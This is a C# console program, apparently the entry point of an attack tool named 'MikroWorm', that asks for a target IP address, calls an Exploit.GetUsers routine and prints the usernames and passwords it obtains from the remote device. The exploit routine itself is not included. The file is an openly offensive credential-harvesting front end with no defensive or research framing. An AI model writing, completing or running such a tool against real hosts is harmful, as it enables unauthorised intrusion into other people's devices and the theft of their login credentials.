using System.Collections;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;

namespace MikroWorm
{
    public class Program
    {


        static void Main(string[] args)
        {
            Console.Title = "MikroWorm - @Zebratic"; 
            Console.WriteLine("### MikroWorm ###");

            while (true)
            {
                Console.Write("Target IP: ");
                string? ip = Console.ReadLine();

                try
                {
                    List<User> users = Exploit.GetUsers(ip);
                    foreach (User user in users)
                        Console.WriteLine($"'{user.Username}' '{user.Password}'");
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                    Console.ReadLine();
                }
            }
        }
    }
}